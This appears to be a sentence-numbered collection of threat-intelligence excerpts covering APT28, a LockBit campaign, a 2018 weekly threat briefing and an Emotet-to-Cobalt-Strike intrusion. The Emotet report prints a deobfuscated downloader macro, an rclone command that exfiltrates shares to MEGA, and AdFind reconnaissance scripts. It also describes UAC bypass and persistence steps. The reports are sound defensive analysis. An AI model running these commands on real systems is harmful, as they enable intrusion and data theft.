sentence.5812: Finally, the malware allows remote command execution by allocating a new region of memory and executing the received shellcode by calling a new dedicated thread.
sentence.5814: According to extracted metadata, attackers worked on the preparation of the campaign between January and February 2022.
sentence.5815: However, both URLs used by attackers appared active even recently (Q3 2022).
sentence.5816: In addition could be interesting to note that, according to the visibility we can dispose of, limited telemetry hits related to the collected artifacts have been catched on 25/08/2022 and 09/09/2022 from two countries of the European Union (we have no data available before 25/08/2022).
sentence.5817: Such recent evidence could suggest some sort of activities still ongoing linked to the described threat or to some of its variants.
sentence.5818: Finally, based on several indicators, geopolitical objectives and the analyzed artifacts, Cluster25 attributes this campaign to the Russia-linked threat actor known as APT28 (aka Fancy Bear, TSAR Team, Pawn Storm, Sednit) and indicates entities and individuals operating in the defense and government sectors of Europe and Eastern Europe countries as potential targets.

sentence.5824: An Emerging LockBit Campaign url: https://www.fortinet.com/blog/threat-research/emerging-lockbit-campaign FortiGuard Labs has observed a new LockBit ransomware campaign during last December and January using a combination of techniques effective against AV and EDR solutions.
sentence.5825: LockBit has been one of the more dangerous ransomware, active since 2019.
sentence.5826: It was part of several successful attacks against a large variety of industries, including critical infrastructure.
sentence.5827: This blog post discusses the infection chain and Tactics, Techniques, and Procedures (TTPs) of this campaign.
sentence.5828: Overview Descriptions of the attack refer to the stages outlined in Figure 1 below.
sentence.5829: The attack starts with a .img container (1) and a social engineering technique of displaying a single file once it’s mounted while hiding the rest of its files from the user.
sentence.5830: It can also cause malware analysts to miss the payloads while examining the samples manually.
sentence.5832: The user is then prompted to open the single visible shortcut (2) file.
sentence.5833: FIgure 2: Contents of the .img file, including the hidden files
sentence.5834: In some of the cases that we’ve observed, a python script is executed (2.1) using the official Python embed package.
sentence.5835: The only purpose of the script is to run the subsequent BAT scripts.
sentence.5836: Some variants used a known UAC bypass method abusing the legitimate fodhelper.exe (3.1).
sentence.5837: This enables the attacker’s BAT file to run in a new elevated process without the user’s approval.
sentence.5839: The BAT script (4) does several things: 1. Changes the password of the logged-in user.
sentence.5841: 3. Ensures that after the system reboots, it logs in without user interaction (using SysInternals Autologon).
sentence.5842: 4. Tries to - a. Set the next reboot to be in Safe Mode using bcdedit.exe.
sentence.5843: b. Register a new service that will run its VBS script (4.1) using sc.exe.
sentence.5844: c. Sets the service to run also in Safe-Mode using reg.exe.
sentence.5846: If it fails, it sets in the registry a BAT file (4.2) to be run on logon as another UI shell by Winlogon.
sentence.5848: Figure 4: Persistence of the BAT file (4.2).
sentence.5849: The ransomware executable resides within a password-protected archive.
sentence.5850: The script that runs after boot executes another BAT script (4.3) to extract the ransomware payload.
sentence.5851: It uses the 7-zip archiver and then runs it with a ‘-pass’ argument that is needed for the malicious executable to unpack itself.
sentence.5852: Figure 5: Command inside BAT script (4.3) decrypting and running the ransomware The final payload is LockBit.
sentence.5853: Analysts from TrendMicro have published an analysis of the ransomware.
sentence.5854: Targeting focuses on Spanish-speaking victims – all samples target Mexican or Spanish firms, mainly in the consulting and law sectors.
sentence.5855: Ransomware note: Your data are stolen and encrypted The data will be published on TOR website if you do not pay the ransom You can contact us and decrypt one file for free on this TOR site (you should download and install TOR browser first https://torproject.org) http://<onion address> Your company id for log in: <unique id> Evasive Tradecraft The detection rate of the samples in VirusTotal was a minimal single digit, with some completely undetected, suggesting the campaign’s methods are effective in defense evasion.
sentence.5856: Figure 6: Detection in VirusTotal of one of the .img files.
sentence.5857: Delivery through a .img container bypasses the Mark of The Web (MOTW) protection mechanism.
sentence.5858: Multi-stage scripts that extract a password-protected ransomware executable, which is unpacked only when run with a unique password, allow evading traditional signature-based detection.
sentence.5859: The malware authors have shown a creative and wide-ranging usage of signed, legitimate executables: the mounting of .img files by Windows Explorer, python execution by a signed interpreter, the extraction of encrypted archives by 7-zip, and automatic log-in using Sysinternals’ Autologon.
sentence.5860: This allows for minimal reliance on custom code, trimming development costs, and staying under the radar of EDRs.
sentence.5861: Summary This campaign’s highly evasive nature demonstrates that attackers continue to leverage increasingly obscure methodologies to avoid detection.
sentence.5862: This unique combination of executables wasn’t seen in previous LockBit attacks.
sentence.5863: These payloads may be related to the LockBit builder leak in late 2022.
sentence.5864: Hence, a definitive attribution to the original group behind LockBit, or its affiliates, may be difficult.
sentence.5865: Other cybercriminals would want to associate themselves with the deterrence already afforded by past acts of LockBit.
sentence.5866: Fortinet Solutions FortiEDR detects and blocks these threats out of the box without any prior knowledge or special configuration.
sentence.5867: It does this using its post-execution prevention engine to identify malicious activities: Figure 7: FortiEDR blocking the ransomware.
sentence.5868: All network IOCs have been added to the FortiGuard WebFilter blocklist.
sentence.5869: FortiGuard Antivirus has coverage in place as follows: W32/Lockbit.

sentence.5871: In addition, as part of our membership in the Cyber Threat Alliance, details of this threat were shared in real-time with other Alliance members to help create better protections for customers.

sentence.5878: Remote Mac Exploitation Via Custom URL Schemes url: https://www.anomali.com/blog/wtb-remote-mac-exploitation-via-custom-url-schemes The intelligence in this week’s iteration discuss the following threats: Anonymous, Apache Struts vulnerability, BusyGasper, Cobalt Gang, DarkComet, DDoS, Loki Bot, Spear phishing, and WINDSHIFT APT.
sentence.5879: The IOCs related to these stories are attached to the Community Threat Briefing and can be used to check your logs for potential malicious activity.
sentence.5880: Trending Threats Remote Mac Exploitation Via Custom URL Schemes (August 30, 2018)
sentence.5881: An obscure Advanced Persistent Threat (APT) called WINDSHIFT has been seen exploiting a flaw in macOS to target government institutions in the Middle East in what appears to be the 1st-stage of a 2nd-stage cyber campaign.
sentence.5882: This 1st-stage attack is intended to gain initial access into a fully patched macOS system to pave the way for the 2nd-stage attack in the future.
sentence.5883: The malware exploits custom URL schemes in the Safari browser to remotely infect macOS targets.
sentence.5884: This requires a minimal amount of user interaction, but this can be "influenced" by the APT group as needed.
sentence.5885: This 1st-stage attack takes advantage of the way macOS registers document handlers and custom URL schemes to automatically unzip a malicious attachment sent via phishing emails in the Safari browser.
sentence.5886: Once the attachment is automatically unzipped, a malicious application in the attachment is in the filesystem and triggers the registration of a custom URL scheme handler.
sentence.5887: The malware can then load the custom URL on the user’s computer so the threat actor can then have access to a system.

sentence.5890: Double The Infection, Double The Fun (August 30, 2018)
sentence.5891: The threat group, Cobalt Gang (also known as TEMP.Metastrike), is suspected to be engaging in attacks against financial organizations in several countries.
sentence.5892: Researchers at ASERT have observed a new campaign targeting institutions in Romania and Russia utilizing spear phishing emails pretending to be from financial vendors or partners to trick users into opening the malicious attachments in the emails.
sentence.5893: The malicious attachments are either a Word document that contains obfuscated VBA scripts or a binary with a JPG extension.
sentence.5894: Both send information to command and control (C2) servers that are owned by Cobalt Group.

sentence.5898: Spearphishing Attachment (T1193) Cryptojackers Exploit Critical Apache Struts Flaw (August 30, 2018) Security experts from Volexity have recently seen a critical Apache Strut vulnerability being exploited in the wild to install a popular cryptocurrency miner on targeted machines.
sentence.5899: The vulnerability, which is known as CVE-2018-11776, comes from an improper validation of namespace input data, and threat actors have already exploited this to install a CNRig cryptocurrency miner on machines.
sentence.5900: [MITRE ATT&CK] Third-party Software (T1072) Anonymous Catalonia Claims DDoS Attack On Bank of Spain Website (August 30, 2018)
sentence.5901: The hacktivist group, Anonymous Catalonia claimed a Distributed Denial of Service (DDoS) attack on Banco de España which forced the bank’s website to be offline and unusable for two days.
sentence.5902: The group claimed the attack via Twitter using the hashtag “TangoDown” to indicate the bank’s hosting server was down globally.
sentence.5903: The hacktivist group targeted the bank, amongst others, to protest the arrests of Catalan leaders who took part in the illegal Independence referendum last year.
sentence.5904: Banco de España stated that while their website was down, none of their normal functionalities were impacted.
sentence.5905: This is a continuation of attacks on various Spanish legal entities following the unsuccessful referendum last year and the so-called “hurting of Catalan people” that this group claims the government is responsible for.
sentence.5906: Click here for Anomali recommendation Air Canada Resets 1.7 Million Accounts After App Breach (August 30, 2018) Air Canada issued password resets to over 1.7 million customers using its mobile application following a data breach that affected 20,000 accounts.
sentence.5907: Unusual login behavior was detected between August 22 and 24, 2018, and the airline proceeded to block further access.
sentence.5908: The data compromised includes: names, email addresses, telephone numbers, and Air Canada Aeroplan account numbers.
sentence.5909: The other data compromised in this breach, which is more worrying, includes passport numbers, NEXUS numbers (allows for quicker access over some borders), traveler numbers, gender, date of birth, nationality, passport expiry date, country of issuance, and country of residence.
sentence.5910: The airline reports that credit card numbers were encrypted and thus safe from the breach.
sentence.5911: Click here for Anomali recommendation BusyGasper – The Unfriendly Spy (August 29, 2018) Security researchers from Kaspersky Lab uncovered a new family of spyware, dubbed “BusyGasper,” that targets Android devices.
sentence.5912: Whilst the malware is not too sophisticated, it does have a broad range of commands that it can do, including keylogging every tap, exfiltrate data from messaging applications such as WhatsApp and Viber, and bypasses the Doze battery saver.
sentence.5913: The malware can deliver payloads from the command and control (C2) server which originates from a free Russian web hosting service called Ucoz.
sentence.5914: This malware is more unusual than most because it appears that the initial attack vector requires the threat actor to physically install the malware on the target’s device, meaning the threat actor needs to actually get a hold of the device somehow.
sentence.5915: Due to the close physical proximity to the target device, researchers have only seen fewer than ten victims and they are all located within Russia.
sentence.5916: Despite the threat actors gaining access to the victim’s bank account information, it does not appear that the intent of the attack is financially-driven.
sentence.5917: [MITRE ATT&CK] Custom Command and Control Protocol (T1094) Loki Bot: On A Hunt For Corporate Passwords (August 29, 2018)
sentence.5918: Researchers from Kaspersky Labs have discovered a malspam campaign pushing the Loki Bot malware through phishing emails.
sentence.5919: The emails have targeted corporate businesses using three possible types of messages to try to get a target to open the email and malicious attachment.
sentence.5920: The threat actors either created fake emails from real companies (usually related to money payments/invoices or shipping statements), fake emails containing financial documents to be looked at, or fake emails containing false order statements or offers for providing services.
sentence.5921: If a target opens the malicious attachment, the Loki Bot malware then can assist in the threat actors gaining access to intellectual property, databases, bank account information, system credentials and more.
sentence.5922: Spearphishing Attachment (T1193) Microsoft Windows Zero-Day Vulnerability Is Disclosed On Twitter (August 29, 2018)
sentence.5923: A Twitter user named “SandboxEscaper” disclosed a zero-day vulnerability in Microsoft Windows.
sentence.5924: This vulnerability escalates a flaw in the operating system’s task scheduler’s Advanced Local Procedure Call (ALPC).
sentence.5925: This vulnerability allows for a threat actor to obtain system privileges and currently has no known workarounds for the vulnerability.
sentence.5926: Microsoft released a statement that it will release a patch for it next month.
sentence.5927: SandboxEscaper attempted to sell the vulnerability on Reddit, but the posts were removed, though it is unclear whether a sale was made before the removal of the posts.
sentence.5929: We're All Sick Of Fortnite, But The Flaw Found In Its Downloader Is The Latest Way To Attack Android (August 29, 2018)
sentence.5930: The Android version of popular game, Fortnite, has been discovered to contain a vulnerability that could allow for a “man-in-the-disk” attack.
sentence.5931: This type of attack works by using the ability to read/write data to external storage to gain access to files in the external storage and modify them with malicious data.
sentence.5932: For the Android version of Fortnite, users are required to download the game through a helper application which is then supposed to download the game file for the device.
sentence.5933: A threat actor can use “man-in-the-disk” to get the user to download a malicious “helper application” instead, allowing the threat actor access to the device.
sentence.5935: [MITRE ATT&CK] Hardware Additions (T1200) Beware Of Fake "Shipping Docs"
sentence.5937: Security researcher Vishal Thakur has discovered a malware campaign that sends emails pretending to be related to a shipment notice for the target which contain a malicious attachment.
sentence.5938: The attachment appears as shipping document that is awaiting to be opened, read through, and approved by the target.
sentence.5939: The attachment appears as a .z file and will install the DarkComet RAT.
sentence.5940: The attachment, if opened, contains a DarkComet Remote Access Trojan (RAT).
sentence.5941: DarkComet then allows for threat actors to obtain logs of the infected machine’s keystrokes, application use, and take screenshots, amongst other things.
sentence.5942: Remote Access Tools (T1219) CeidPageLock: A Chinese RootKit (August 28, 2018)
sentence.5943: A new version of the browser-hijacking rootkit called “CEIDPageLock” has been found being distributed by the RIG Exploit kit by Check Point researchers.
sentence.5944: CEIDPageLock attempts to manipulate a user’s browser and turn their homepage to a Chinese web directory, 2435.com.
sentence.5945: This new version of the malware monitors user’s browsing data and replaces the content of popular Chinese sites with the fake homepage of 2345.com.
sentence.5946: Threat actors can then monitor what sites victims go to and how long they are on each website to potentially lead targeted advertisement campaigns or sell that information to other companies.
sentence.5947: Most of the victims originated in China, however, other victims located in the UK, Taiwan, Hong Kong, the US, Denmark, and Japan were also observed.
sentence.5948: CEIDPageLock is most likely distributed via the RIG’s landing page which exploits a browser vulnerability to gain code execution.
sentence.5949: From there, the malware dropper is downloaded then extracts the driver from within itself and saves it in the “\\Windows\\Temp” directory with the filename “houzi.sys.”
sentence.5950: The dropper then starts the malicious 32-bit driver that connects to the command and control (C2) hard-coded domains to download the specific 2345.com homepage configuration.
sentence.5951: This version of CEIDPageLock has VMProtect, which makes analysis and unpacking difficult and also redirects victims to the specific homepage when they attempt to access specific Chinese websites.
sentence.5955: Abbyy Leaked 203,000 Sensitive Customer Documents In Server Lapse (August 27, 2018)
sentence.5956: The maker of an optical recognition software, Abbyy, suffered a breach of sensitive customer data because of a database server that was left unsecured without a password on the Internet.
sentence.5957: The company’s MongoDB server was misconfigured in such a way that allowed for over 203,000 sensitive documents dating back to 2012 up to the present to be publicly accessible.
sentence.5958: The server was taken offline after it was privately disclosed within the company.
sentence.5959: According to the company, the breach only affected one customer and files involving commercial information and that customer has been notified, as well as Abbyy has taken corrective measures to the problem.
sentence.5960: They have not released information regarding if unauthorized users had accessed the database while it was public.

sentence.5964: Additional information regarding the threats discussed in this week’s Community Threat Briefing can be found below: Spear Phishing Spear phishing is a tactic in which a threat actor targets a specific business, individual, or organization via email or another form of electronic communication while tricking the recipient into thinking the email originated from an authentic source.
sentence.5965: The objective of spear phishing is to gain an initial infection vector within a particular company’s or individual’s network.
sentence.5966: Threat actors will attempt to make the communication appear to originate from a source that the recipient would be familiar with and/or deem trustworthy.
sentence.5967: Spear phishing is used by all levels of threat actors, including Advanced Persistent Threat (APT) groups.
sentence.5969: An Emotet Story url: https://thedfirreport.com/2022/09/12/dead-or-alive-an-emotet-story/ In this intrusion from May 2022, we observed a domain-wide compromise that started from a malware ridden Excel document containing the never-dying malware, Emotet.
sentence.5970: The post-exploitation started very soon after the initial compromise.
sentence.5971: The threat actors began enumerating the network once Emotet deployed a Cobalt Strike beacon on the beachhead host.
sentence.5972: After three days of discovery and lateral movement, the threat actors exfiltrated sensitive data using Rclone before leaving the network.
sentence.5973: After a successful takedown thanks to Interpol and Eurojust efforts, Emotet was resurrected in November 2021 with the help of Trickbot malware.
sentence.5974: Since then, Emotet has been testing different initial access payloads while its developers were busy improving the core functionality of the actual malware.
sentence.5975: Since January 2022 we observed an increase in the activity of Cobalt Strike deployments following Emotet intrusions.
sentence.5976: In a few weeks, we’ll have another Emotet report out from June, where the intrusion used similar TTPs and ended in ransomware.
sentence.5977: Case Summary Back in May, we witnessed an intrusion that started from a phishing email which included Emotet.
sentence.5978: The intrusion lasted four days and contained many of the usual suspects, including the Cobalt Strike post-exploitation framework.
sentence.5979: The Emotet infection was delivered using a xls file containing a malicious macro, a technique that has been on the wane in recent months.
sentence.5980: After executing the Emotet malware, it ran a few basic Windows discovery commands (systeminfo, ipconfig, etc.), wrote a registry run key for persistence, and made its initial call outs to the command and control servers.
sentence.5981: Around 40 minutes after the initial execution, the Emotet malware started to run a new Emotet email spreader campaign.
sentence.5982: This entailed connecting to various email servers and sending new emails with attached xls and zip files.
sentence.5983: This activity continued until the UTC clock turned over to the next day; at which point, the email spreader halted for a period of time and around seven hours into the second day, it began running the email spreader again.
sentence.5984: Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.
sentence.5985: Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder.
sentence.5986: Around 30 minutes after dropping the beacon the threat actor injected into a dllhost.exe process and then proceeded to dump credentials from LSASS.
sentence.5987: Another 20 minutes later, the threat actor ran Invoke-ShareFinder again and Invoke-Kerberoast.
sentence.5988: At 29 hours from initial access, the threat actors began their first lateral movement.
sentence.5989: This was achieved by transferring a Cobalt Strike DLL over SMB and executing via a remote service on another workstation.
sentence.5990: From there, they ran Invoke-Sharefinder once again, along with AdFind, using a batch file named find.bat.
sentence.5991: Pass-the-Hash behavior was observed targeting several accounts on the lateral host.
sentence.5992: Use of Cobalt Strike’s Get-System module was also apparent via the logs.
sentence.5993: The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network.
sentence.5994: More account discovery was then observed, with queries for Domain Administrators and a backup account.
sentence.5995: At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL.
sentence.5996: Once on the Domain Controller, the threat actors again used Get-System to elevate and then dumped LSASS.
sentence.5997: After completing that activity, the threat actors chose another server to push a file, 1.msi, to, which was the installation package for Atera–for an additional means of persistence and command and control.
sentence.5998: During this whole second day, the original Emotet infection on the beachhead host was still trying to send more malicious emails, finally stopping for the day a little before 23:00 UTC.
sentence.5999: They returned the next day, at the same time as the previous day, and picked up where they left off.
sentence.6000: They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer.
sentence.6001: Once again, they executed Invoke-Sharefinder, AdFind, and the p.bat batch script to ping online servers.
sentence.6002: Using the remote admin tools, they used Rclone to exfiltrate important data from a file server and upload it to MEGA.
sentence.6003: Interestingly, the threat actors exfiltrated the same data twice while running Rclone with the parameter –ignore-existing from two different hosts on the network.
sentence.6004: Around 20:00 UTC the Emotet infection on the beachhead host began its email spreader activity again, only to halt at the change over at 00:00 UTC.
sentence.6005: On the last day of this intrusion, the threat actors returned during their normal working hours and used Rclone to exfiltrate IT-related data from a separate server.
sentence.6006: This was the last activity we observed from this group.
sentence.6007: These cases commonly end up with ransomware in addition to data exfiltration.
sentence.6008: This, however, was not the case with this intrusion as the threat actors were evicted before any final actions could be taken.
sentence.6009: Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc.
sentence.6010: More information on this service and others can be found here.
sentence.6011: We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.
sentence.6012: Timeline Analysis and reporting completed by @Kostastsale and @IcsNick Initial Access
sentence.6013: The threat actor gained access to the environment after a user opened an Excel document and enabled macros.
sentence.6014: The document came in via email in the form of a zip file which included an xls file.
sentence.6016: The document contains hidden sheets, has white characters on a white background, and is attributed to SilentBuilder with Emotet, epoch5.
sentence.6017: To deobfuscate the document the tool xlmdeobfuscator was used with the following output.
sentence.6018: After deobfuscation and cleaned up, the code in the macro looks as follows.
sentence.6021: =IF(JRSJG5<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http[:]//loa-hk[.]com/wp-content/ffBag/","..\hvxda.ocx",0,0)) =IF(JRSJG6<0, CLOSE(0),) =EXEC("C:\Windows\System32\regsvr32.exe ..\hvxda.ocx") =R Execution Emotet Execution The execution is done from an Excel document using regsvr32.exe with the payload, hvxda.ocx, that is a DLL file with the name of random characters, llJyMIOvft.dll .
sentence.6022: Worth noting, the Excel document failed to download the second payload from a few of the embedded URLs.
sentence.6023: A new file is then created in C:\%USERPROFILE%\AppData\Local\ with a folder that also consists of random characters.
sentence.6024: Cobalt Strike Execution The Emotet DLL is then used to download Cobalt Strike, which is then injected into svchost and dllhost.
sentence.6025: Sysmon showing Emotet starting the Cobalt Strike executable.
sentence.6026: A great way to get the Malleable profile (and additional beacon config), is to use Didier Stevens’s fantastic tool 1768.py.
sentence.6027: Here, the tool is used with a process dump of the executable.
sentence.6028: Persistence The Emotet malware infection on the beachhead host used a registry run key to maintain persistence.
sentence.6029: This registry key activity (Sysmon EventID 12 & 13) was observed continuously on the beachhead host for the first few days of the intrusion.
sentence.6030: Beyond the beachhead host, the threat actor deployed several Atera/Splashtop remote access tools across the environment as an alternative means of access to the environment should they lose access to their Cobalt Strike beacons.
sentence.6031: Privilege Escalation Use of Cobalt Strike’s Get-System named pipe technique was observed on the Domain Controller and other hosts to elevate to System privileges.
sentence.6032: Defense Evasion Process injection was observed during the intrusion by both Emotet and Cobalt Strike.
sentence.6033: Emotet injected multiple times into svchost to execute certain functions, including discovery commands.
sentence.6034: Cobalt Strike used process hollowing to launch under the context of the Dllhost.exe process.
sentence.6035: We later saw Dllhost.exe injecting into multiple other processes, such as explorer.exe and svchost.exe, to execute further payloads.
sentence.6036: Scanning process memory across affected hosts reveals both the direct Cobalt Strike processes and the injected processes using the Malpedia yara rule.

sentence.6040: -s LSM win_cobalt_strike_auto 9308 regsvr32.exe regsvr32 C:\ProgramData\1.dll win_cobalt_strike_auto 1056 svchost.exe C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p win_cobalt_strike_auto 1428 svchost.exe C:\Windows\system32\svchost.exe -k ICService -p win_cobalt_strike_auto 6036 regsvr32.exe regsvr32 C:\ProgramData\1.dll win_cobalt_strike_auto Credential Access From the beachhead host credentials appear to have been dumped from an injection into the SearchIndexer process on the host.
sentence.6041: Data observed using sysmon event id 10 shows the use of the SearchIndexer process, similar to behavior observed in a prior case, followed by known Cobalt Strike malleable profile named pipes.
sentence.6042: EventID: 10 SourceImage: C:\Windows\system32\SearchIndexer.exe TargetImage: C:\Windows\system32\lsass.exe GrantedAccess: 136208 CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d1e4|C:\Windows\System32\KERNELBASE.dll+2bcbe|C:\Program Files\Common Files\Microsoft
sentence.6047: EventID: 17 EventType: CreatePipe Image: C:\Windows\system32\SearchIndexer.exe PipeName: \SearchTextHarvester Shortly after the credential dump using the SearchIndexer process, the Cobalt Strike process ran Invoke-Kerberoast looking for roastable accounts within the organization.
sentence.6048: We observed Cobalt Strike beacons accessing LSASS on multiple occasions, on almost every compromised host.
sentence.6049: Discovery On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities.
sentence.6051: On the second day, the hands on activity from Cobalt Strike performed a more thorough examination of that host’s Windows domain.
sentence.6060: The threat actors launched the PowerView module, Invoke-Sharefinder, from almost all of the hosts to which they pivoted, including the domain controller.
sentence.6061: AdFind.exe, the command-line Active Directory query tool, was run on only one of the compromised hosts via the find.bat batch script.
sentence.6062: The contents of the script are below: find.exe -f "(objectcategory=person)" > ad_users.txt find.exe -f "objectcategory=computer" > ad_computers.txt find.exe -f "(objectcategory=organizationalUnit)" > ad_ous.txt find.exe -sc trustdmp > trustdmp.txt find.exe -subnets -f (objectCategory=subnet)> subnets.txt find.exe -f "(objectcategory=group)" > ad_group.txt find.exe -gcb -sc trustdmp > trustdmp.txt echo end Using the data collected from previous activity, they created a target list which was then fed to a batch script named p.bat.
sentence.6063: The batch file contained one line, which pinged a list of servers (servers.txt).
sentence.6064: The line can be seen below: for /f
sentence.6067: i -n 1 >> res.txt Additionally, the threat actors displayed the share directories using dir.exe via the interactive shell from the Cobalt Strike beacon.
sentence.6068: Lateral Movement The Cobalt Strike jump psexec (Run service EXE on the remote host) produced a 7045 System Windows event on remote hosts.
sentence.6069: Example: Below, the network traffic shows the SMB lateral transfer of one of the Atera Agent MSI installers (1.msi) used to gain access laterally on a host and provide persistence for later access.
sentence.6070: The same can be observed for other payloads used during the intrusion as well; here we can see that same data using Zeek logs when the threat actors transferred the 1.dll Cobalt Strike beacon laterally to gain access to additional hosts.
sentence.6071: We also observed Pass-The-Hash used throughout the intrusion via the Cobalt Strike Beacons.
sentence.6072: Threat actors used PTH to acquire a session with elevated user access.
sentence.6073: We observed the below logs being generated on the source host and domain controller that indicate the use of PTH.
sentence.6074: Source Host: - Windows EID 4624 Logon Type = 9 Authentication Package = Negotiate Logon Process = seclogo - Windows EID 467 Domain Controller: - Windows EID 4776
sentence.6075: You can read more about detecting “Pass-The-Hash” here by Stealthbits and here by Hausec.

compromised hosts during the intrusion.
sentence.6081: Atera granted the threat actors with interactive access.
sentence.6082: We cannot, however, confirm that the threat actors utilized this access because the majority of activity originated through the Cobalt Strike beacons.
sentence.6083: Exfiltration The threat actors used Rclone to exfiltrate sensitive data to MEGA.io cloud storage.
sentence.6084: Command line logging revealed the destination to be the Mega service and the network shares targeted.
sentence.6085: rclone.exe, copy, \\REDACTED\Shares, mega:Shares, -q, --ignore-existing, --auto-confirm, --multi-thread-streams, 4, --transfers, 4 This activity was also visible on the network via Zeek logs showing the SMB share connection activity.
sentence.6086: Actions on Objectives Emotet has for some time been used as an initial access broker for various intrusions; however, some Emotet infections get tasked with continuing the delivery of new campaigns.
sentence.6087: In this intrusion, we observed both tasks occurring during the same time with both the delivery of access to the threat actor utilizing Cobalt Strike and exfiltrating data from the network, all the while, the original Emotet malware was tasked to deliver new malicious emails.
sentence.6088: The Emotet mailer started roughly once each day during the intrusion.
sentence.6089: Marked by bursts of connection to various email servers.
sentence.6090: The emails were sent through various compromised email accounts, propagating additional malicious xls files to further propagate Emotet access.
sentence.6091: We did not see any further activity but we believe if given enough time, this would have ended with domain wide ransomware.
sentence.6092: We have a case coming up in a few weeks where it does exactly that.
